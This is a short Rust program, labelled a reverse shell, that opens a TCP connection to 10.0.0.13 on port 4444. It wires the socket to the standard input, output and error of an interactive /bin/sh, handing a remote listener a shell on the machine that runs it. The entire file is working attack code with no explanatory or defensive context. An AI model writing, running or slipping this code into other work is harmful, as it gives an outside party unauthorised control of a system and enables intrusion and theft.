// Rust reverse shell
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() -> std::io::Result<()> {
    let stream = TcpStream::connect("10.0.0.13:4444")?;
    let fd = stream.as_raw_fd();
    let (stdin, stdout, stderr) = unsafe {
        (
            Stdio::from_raw_fd(libc::dup(fd)),
            Stdio::from_raw_fd(libc::dup(fd)),
            Stdio::from_raw_fd(libc::dup(fd)),
        )
    };
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(stdin)
        .stdout(stdout)
        .stderr(stderr)
        .spawn()?
        .wait()?;
    Ok(())
}
